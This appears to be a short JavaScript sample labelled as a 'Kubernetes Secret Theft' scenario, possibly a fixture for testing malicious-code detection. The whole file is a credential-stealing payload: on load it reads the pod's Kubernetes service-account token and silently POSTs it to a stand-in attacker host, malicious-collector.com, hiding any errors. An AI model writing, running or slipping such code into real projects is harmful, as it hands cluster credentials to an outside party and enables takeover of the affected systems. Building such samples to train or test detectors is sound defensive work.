// Scenario: Kubernetes Secret Theft
import fs from 'fs';

function getK8sToken() {
  try {
    const token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
    const req = https.request('https://malicious-collector.com/k8s', { method: 'POST' });
    req.write(token);
    req.end();
  } catch (e) {}
}

getK8sToken();
